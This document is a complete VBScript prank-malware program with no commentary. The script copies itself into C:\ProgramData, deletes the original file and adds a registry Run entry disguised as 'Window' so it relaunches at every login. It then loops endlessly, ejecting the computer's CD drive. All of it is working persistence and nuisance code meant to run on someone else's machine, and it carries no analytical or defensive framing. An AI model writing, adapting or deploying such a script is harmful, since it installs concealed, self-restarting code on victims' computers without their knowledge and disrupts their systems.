Dim cpath, rpath, fname
'Set path and name
fname = "dancing_cdrom.vbs"
cpath = "C:\ProgramData\"
rpath = "C:\ProgramData\dancing_cdrom.vbs"
Set script = CreateObject("WMPlayer.OCX.7" )
Set wshell = CreateObject ("WScript.Shell")
'Copy and delete file
Set fso = CreateObject("Scripting.FileSystemObject") 
Set obf = fso.GetFile(fname)
obf.Copy cpath, True
obf.Delete
'Use autorun on start system
wshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Window",rpath
'Use loop for dancing nums
Set device_action = script.cdromCollection
do
device_action.Item(i).Eject
device_action.Item(i).Eject
loop